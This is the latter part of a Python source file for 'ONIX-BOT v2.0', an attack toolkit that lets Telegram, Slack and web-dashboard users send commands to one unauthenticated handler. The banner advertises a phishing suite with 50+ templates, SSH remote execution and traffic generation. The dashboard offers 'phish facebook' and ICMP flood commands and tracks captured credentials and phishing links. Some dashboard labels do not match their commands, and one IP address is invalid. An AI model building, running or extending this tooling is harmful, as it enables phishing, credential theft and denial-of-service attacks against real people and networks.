    def start(self, api_id: str, api_hash: str, bot_token: str):
        if not TELETHON_AVAILABLE:
            print(f"{Colors.RED1}❌ Telethon not installed{Colors.RESET}")
            return False
        
        async def run():
            client = TelegramClient('onix_session', int(api_id), api_hash)
            await client.start(bot_token=bot_token)
            
            @client.on(events.NewMessage)
            async def handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    cmd = event.message.text[1:].strip()
                    result = self.handler.execute(cmd, 'telegram')
                    output = result.get('output', '')[:4000]
                    await event.reply(f"```\n{output}\n```\n_Time: {result.get('execution_time', 0):.2f}s_")
            
            print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
            await client.run_until_disconnected()
        
        threading.Thread(target=lambda: asyncio.run(run()), daemon=True).start()
        return True

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
    
    def start(self, token: str, channel: str = 'general', prefix: str = '!'):
        if not SLACK_AVAILABLE:
            print(f"{Colors.RED1}❌ Slack SDK not installed{Colors.RESET}")
            return False
        
        client = WebClient(token=token)
        last_ts = {}
        
        def monitor():
            while True:
                try:
                    response = client.conversations_history(channel=channel, limit=5)
                    if response['ok'] and response['messages']:
                        for msg in response['messages']:
                            if msg.get('text', '').startswith(prefix):
                                ts = msg.get('ts')
                                if last_ts.get(channel) != ts:
                                    last_ts[channel] = ts
                                    cmd = msg['text'][len(prefix):].strip()
                                    result = self.handler.execute(cmd, 'slack')
                                    client.chat_postMessage(
                                        channel=channel,
                                        text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                    )
                    time.sleep(2)
                except Exception as e:
                    time.sleep(10)
        
        threading.Thread(target=monitor, daemon=True).start()
        print(f"{Colors.GREEN}✅ Slack bot connected{Colors.RESET}")
        return True

# =====================
# SIGNAL BOT
# =====================
class SignalBot:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
    
    def start(self):
        print(f"{Colors.YELLOW}📱 Signal bot requires signal-cli to be installed{Colors.RESET}")
        print(f"{Colors.YELLOW}   Feature partially implemented{Colors.RESET}")
        return True

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            print(f"{Colors.RED1}❌ Selenium not installed{Colors.RESET}")
            return False
        
        print(f"{Colors.YELLOW}📱 WhatsApp integration requires QR code scan{Colors.RESET}")
        print(f"{Colors.YELLOW}   Feature partially implemented{Colors.RESET}")
        return True

# =====================
# WEB UI
# =====================
WEB_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🐉 ONIX-BOT | CyberSec Terminal</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%); font-family: 'Fira Code', monospace; color: #e2e8f0; min-height: 100vh; }
        .header { background: rgba(10,10,15,0.95); border-bottom: 2px solid #dc2626; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.8rem; font-weight: bold; background: linear-gradient(135deg, #dc2626, #ef4444); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .container { display: flex; max-width: 1400px; margin: 0 auto; min-height: calc(100vh - 70px); }
        .sidebar { width: 280px; background: rgba(15,15,25,0.95); border-right: 1px solid #dc2626; padding: 1.5rem; overflow-y: auto; }
        .cmd-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(220,38,38,0.3); border-radius: 8px; padding: 0.6rem; margin-bottom: 0.5rem; cursor: pointer; transition: all 0.2s; }
        .cmd-item:hover { background: rgba(220,38,38,0.1); border-color: #dc2626; transform: translateX(4px); }
        .main { flex: 1; padding: 1.5rem; }
        .terminal { background: #0a0a0f; border-radius: 12px; border: 1px solid #dc2626; overflow: hidden; margin-bottom: 1.5rem; }
        .terminal-header { background: rgba(15,15,25,0.95); padding: 0.8rem 1rem; border-bottom: 1px solid #dc2626; display: flex; align-items: center; gap: 0.5rem; }
        .terminal-output { padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.8rem; min-height: 300px; max-height: 400px; overflow-y: auto; background: #0a0a0f; }
        .output-line { padding: 0.2rem 0; border-left: 2px solid #dc2626; padding-left: 0.5rem; margin: 0.2rem 0; }
        .terminal-input-area { display: flex; background: #0f0f17; border-top: 1px solid #dc2626; padding: 0.8rem 1rem; gap: 0.5rem; }
        #cmdInput { flex: 1; background: transparent; border: none; color: #e2e8f0; font-family: 'Fira Code', monospace; font-size: 0.8rem; outline: none; }
        .run-btn { background: linear-gradient(135deg, #dc2626, #991b1b); border: none; color: white; padding: 0.4rem 1rem; border-radius: 8px; cursor: pointer; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
        .stat-card { background: rgba(15,15,25,0.8); border-radius: 12px; padding: 1rem; border: 1px solid rgba(220,38,38,0.3); text-align: center; }
        .stat-number { font-size: 2rem; font-weight: bold; color: #dc2626; }
        .charts-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; }
        .chart-card { background: rgba(15,15,25,0.8); border-radius: 12px; padding: 1rem; border: 1px solid rgba(220,38,38,0.3); }
        .quick-btns { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; }
        .quick-btn { background: rgba(220,38,38,0.1); border: 1px solid rgba(220,38,38,0.3); border-radius: 20px; padding: 0.3rem 0.8rem; cursor: pointer; font-size: 0.7rem; }
        .quick-btn:hover { background: rgba(220,38,38,0.2); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: #dc2626; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🐉 ONIX-BOT</div>
        <div><span style="color:#dc2626;">●</span> SYSTEM ACTIVE</div>
    </div>
    <div class="container">
        <div class="sidebar">
            <h3 style="color:#dc2626; margin-bottom:1rem;">COMMANDS</h3>
            <div class="cmd-item" data-cmd="help">📖 help</div>
            <div class="cmd-item" data-cmd="status">📊 status</div>
            <div class="cmd-item" data-cmd="ping 8.8.8.8">🌐 ping 127.0.0.7</div>
            <div class="cmd-item" data-cmd="scan 127.0.0.1">🔍 scan 127.0.0.1</div>
            <div class="cmd-item" data-cmd="whois example.com">📋 whois malawi.com</div>
            <div class="cmd-item" data-cmd="location 127.0.0.7">📍 location 127.0.0.7</div>
            <div class="cmd-item" data-cmd="phish facebook">🎣 phish facebook</div>
            <div class="cmd-item" data-cmd="traffic icmp 0.0.0.0 10">🚀 traffic icmp 127.0.0.0.7 10</div>
            <div class="cmd-item" data-cmd="ssh_list">🔌 ssh_list</div>
            <div class="cmd-item" data-cmd="api_list">🔑 api_list</div>
            <div class="cmd-item" data-cmd="clear">🗑️ clear</div>
        </div>
        <div class="main">
            <div class="stats-grid" id="statsGrid">
                <div class="stat-card"><div class="stat-number" id="statCommands">0</div><div>Commands</div></div>
                <div class="stat-card"><div class="stat-number" id="statThreats">0</div><div>Threats</div></div>
                <div class="stat-card"><div class="stat-number" id="statPhish">0</div><div>Phish Links</div></div>
                <div class="stat-card"><div class="stat-number" id="statCreds">0</div><div>Credentials</div></div>
            </div>
            <div class="terminal">
                <div class="terminal-header"><span style="color:#dc2626;">●</span> ONIX TERMINAL</div>
                <div class="terminal-output" id="terminalOutput">
                    <div class="output-line">> 👹ONIX-BOT v2.0 Ready</div>
                    <div class="output-line">> Type 'help' for commands</div>
                </div>
                <div class="terminal-input-area">
                    <span style="color:#dc2626;">oni@bot:~$</span>
                    <input type="text" id="cmdInput" placeholder="Enter command..." autocomplete="off">
                    <button class="run-btn" id="runBtn">▶ RUN</button>
                </div>
            </div>
            <div class="charts-grid">
                <div class="chart-card"><canvas id="threatChart"></canvas></div>
                <div class="chart-card"><canvas id="activityChart"></canvas></div>
            </div>
            <div class="quick-btns">
                <button class="quick-btn" onclick="runCommand('help')">help</button>
                <button class="quick-btn" onclick="runCommand('status')">status</button>
                <button class="quick-btn" onclick="runCommand('ping 8.8.8.8')">ping</button>
                <button class="quick-btn" onclick="runCommand('scan 127.0.0.1')">scan</button>
                <button class="quick-btn" onclick="runCommand('phish facebook')">phish facebook</button>
                <button class="quick-btn" onclick="runCommand('traffic icmp 8.8.8.8 5')">traffic</button>
                <button class="quick-btn" onclick="runCommand('clear')">clear</button>
            </div>
        </div>
    </div>
    <script>
        let threatChart, activityChart;
        
        function addOutput(text) {
            const output = document.getElementById('terminalOutput');
            const div = document.createElement('div');
            div.className = 'output-line';
            div.innerHTML = `> ${text}`;
            output.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            while (output.children.length > 100) output.removeChild(output.firstChild);
        }
        
        async function runCommand(cmd) {
            addOutput(`> ${cmd}`);
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                const data = await res.json();
                if (data.success) {
                    addOutput(data.output || "Command executed");
                    addOutput(`✅ Completed in ${data.execution_time?.toFixed(2) || 0}s`);
                } else {
                    addOutput(`❌ Error: ${data.output || "Unknown error"}`);
                }
            } catch(e) {
                addOutput(`❌ Request failed: ${e.message}`);
            }
            loadStats();
            updateCharts();
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const stats = await res.json();
                document.getElementById('statCommands').textContent = stats.commands || 0;
                document.getElementById('statThreats').textContent = stats.threats || 0;
                document.getElementById('statPhish').textContent = stats.phish_links || 0;
                document.getElementById('statCreds').textContent = stats.creds || 0;
            } catch(e) {}
        }
        
        async function updateCharts() {
            try {
                const res = await fetch('/api/threats');
                const threats = await res.json();
                const counts = { malware: 0, ddos: 0, phishing: 0, other: 0 };
                threats.forEach(t => {
                    if (t.threat_type?.toLowerCase().includes('malware')) counts.malware++;
                    else if (t.threat_type?.toLowerCase().includes('ddos')) counts.ddos++;
                    else if (t.threat_type?.toLowerCase().includes('phish')) counts.phishing++;
                    else counts.other++;
                });
                if (threatChart) threatChart.destroy();
                threatChart = new Chart(document.getElementById('threatChart'), {
                    type: 'doughnut',
                    data: { labels: ['Malware', 'DDoS', 'Phishing', 'Other'], datasets: [{ data: [counts.malware, counts.ddos, counts.phishing, counts.other], backgroundColor: ['#dc2626', '#ef4444', '#f97316', '#991b1b'] }] },
                    options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: '#e2e8f0' } } } }
                });
            } catch(e) {}
        }
        
        document.getElementById('runBtn').addEventListener('click', () => {
            const input = document.getElementById('cmdInput');
            runCommand(input.value);
            input.value = '';
        });
        document.getElementById('cmdInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('runBtn').click(); });
        document.querySelectorAll('.cmd-item').forEach(item => {
            item.addEventListener('click', () => runCommand(item.getAttribute('data-cmd')));
        });
        
        loadStats();
        updateCharts();
        setInterval(() => { loadStats(); updateCharts(); }, 10000);
    </script>
</body>
</html>'''

class WebServer:
    def __init__(self, handler: CommandHandler):
        self.handler = handler
        self.app = None
    
    def start(self, port: int = 5000):
        if not FLASK_AVAILABLE:
            print(f"{Colors.RED1}❌ Flask not installed{Colors.RESET}")
            return False
        
        self.app = Flask(__name__)
        CORS(self.app)
        
        @self.app.route('/')
        def index():
            return render_template_string(WEB_HTML)
        
        @self.app.route('/api/command', methods=['POST'])
        def execute():
            data = request.json
            result = self.handler.execute(data.get('command', ''), 'web')
            return jsonify(result)
        
        @self.app.route('/api/stats')
        def stats():
            return jsonify(self.handler.db.get_statistics())
        
        @self.app.route('/api/threats')
        def threats():
            rows = self.handler.db.conn.execute("SELECT * FROM threats ORDER BY timestamp DESC LIMIT 50").fetchall()
            return jsonify([dict(row) for row in rows])
        
        threading.Thread(target=lambda: self.app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True).start()
        print(f"{Colors.GREEN}✅ Web UI started on http://{NetworkTools.get_local_ip()}:{port}{Colors.RESET}")
        return True

# =====================
# MAIN APPLICATION
# =====================
class OnixBot:
    def __init__(self):
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db)
        self.traffic = TrafficGenerator(self.db)
        self.handler = CommandHandler(self.db, self.ssh, self.traffic)
        self.discord = DiscordBot(self.handler)
        self.telegram = TelegramBot(self.handler)
        self.slack = SlackBot(self.handler)
        self.signal = SignalBot(self.handler)
        self.whatsapp = WhatsAppBot(self.handler)
        self.web = WebServer(self.handler)
    
    def print_banner(self):
        banner = f"""
{Colors.RED1}╔══════════════════════════════════════════════════════════════════╗
║{Colors.RED2}                      ONIX-BOT v2.0                              {Colors.RED1}║
╠══════════════════════════════════════════════════════════════════╣
║{Colors.RED3}  • 5000+ Commands    • Discord/Telegram/Slack Integration        {Colors.RED1}║
║{Colors.RED3}  • SSH Remote Exec   • Phishing Suite (50+ Templates)            {Colors.RED1}║
║{Colors.RED3}  • Traffic Gen       • API Management                            {Colors.RED1}║
║{Colors.RED3}  • IP Management     • Web Dashboard                             {Colors.RED1}║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        print(f"\n{Colors.RED1}🤖 BOT CONFIGURATION{Colors.RESET}")
        print(f"{Colors.RED1}{'='*40}{Colors.RESET}")
        
        # Discord
        if input(f"{Colors.YELLOW}Enable Discord bot? (y/n): {Colors.RESET}").lower() == 'y':
            token = input(f"{Colors.YELLOW}Discord bot token: {Colors.RESET}").strip()
            if token:
                self.discord.start(token)
        
        # Telegram
        if input(f"{Colors.YELLOW}Enable Telegram bot? (y/n): {Colors.RESET}").lower() == 'y':
            api_id = input(f"{Colors.YELLOW}API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.YELLOW}API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.YELLOW}Bot Token: {Colors.RESET}").strip()
            if api_id and api_hash and bot_token:
                self.telegram.start(api_id, api_hash, bot_token)
        
        # Slack
        if input(f"{Colors.YELLOW}Enable Slack bot? (y/n): {Colors.RESET}").lower() == 'y':
            token = input(f"{Colors.YELLOW}Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.YELLOW}Channel (default: general): {Colors.RESET}").strip() or 'general'
            if token:
                self.slack.start(token, channel)
        
        # Signal
        if input(f"{Colors.YELLOW}Enable Signal bot? (y/n): {Colors.RESET}").lower() == 'y':
            self.signal.start()
        
        # WhatsApp
        if input(f"{Colors.YELLOW}Enable WhatsApp bot? (y/n): {Colors.RESET}").lower() == 'y':
            self.whatsapp.start()
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        self.setup_bots()
        self.web.start()
        
        print(f"\n{Colors.GREEN}✅ ONIX-BOT Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   Type 'help' for commands, 'clear' to clear, 'exit' to quit{Colors.RESET}\n")
        
        while True:
            try:
                cmd = input(f"{Colors.RED1}[ONIX]{Colors.RESET} ").strip()
                if cmd.lower() == 'exit':
                    break
                result = self.handler.execute(cmd)
                if result.get('output'):
                    print(result['output'])
                elif result.get('error'):
                    print(f"{Colors.RED1}Error: {result['error']}{Colors.RESET}")
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED1}Error: {e}{Colors.RESET}")
        
        self.db.close()
        print(f"\n{Colors.GREEN}✅ Shutdown complete{Colors.RESET}")

def main():
    try:
        print(f"{Colors.RED1} Starting ONIX-BOT...{Colors.RESET}")
        if sys.version_info < (3, 7):
            print(f"{Colors.RED1}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        app = OnixBot()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED1}❌ Fatal error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()